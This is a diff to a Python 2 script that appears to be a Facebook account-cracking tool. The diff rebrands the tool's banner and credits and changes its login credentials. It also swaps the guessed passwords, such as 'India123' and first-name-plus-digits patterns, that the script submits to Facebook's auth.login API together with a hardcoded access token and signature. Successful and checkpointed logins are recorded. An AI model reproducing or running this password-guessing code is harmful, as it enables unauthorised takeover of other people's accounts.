@@ -48,13 +48,19 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[1;93m█████████
-\033[1;91m█▄█████▄█      \033[1;93m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
-\033[1;91m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
-\033[1;91m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
-\033[1;91m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96  Waheed Khan🔥✔
-\033[1;91m█████████      \033[1;92m«----------✧----------»
-\033[1;91m ██ ██
+
+██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
+██║░██╔╝██║░░██║██╔══██╗████╗░██║
+█████═╝░███████║███████║██╔██╗██║
+██╔═██╗░██╔══██║██╔══██║██║╚████║
+██║░╚██╗██║░░██║██║░░██║██║░╚███║
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+
+
+
+
+
+
 \033[1;93m    💀●●●●●●●●●●●●●●●●●●●●●●●◄►●●●●●●●●●●●●●●●●●●●●●●●💀
 \033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  𝕸𝖗.PATHAN              ║    
 \033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ WAHEED KHAN            ║  
@@ -79,7 +85,7 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 \033[1;91m************************************************
-\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR KhAn BaBa💕 ~
+\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR KhAn LaLa💕 ~
 \033[1;93m************************************************
 
 \033[1;95m____─▄───────▄█▄───────▄─ Stay Home 💓
@@ -99,8 +105,8 @@ jalan("\033[1;92m |_| ")
 
 
 
-CorrectUsername = "khan"
-CorrectPassword = "khan"
+CorrectUsername = "pathan"
+CorrectPassword = "pathan"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
@@ -421,7 +427,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Pakistan'											
+							                           pass6 = 'India123'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -443,7 +449,7 @@ def pilih_super():
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass6)	
 						                                           else:							
-								                               pass7 = b['first_name']+'786'						
+								                               pass7 = b['first_name']+'007'						
 								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
 								                               q = json.load(data)						
 								                               if 'access_token' in q:		
@@ -487,7 +493,7 @@ def pilih_super():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['first_name'] + '007'					
+										                                       pass9 = b['first_name'] + '321'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
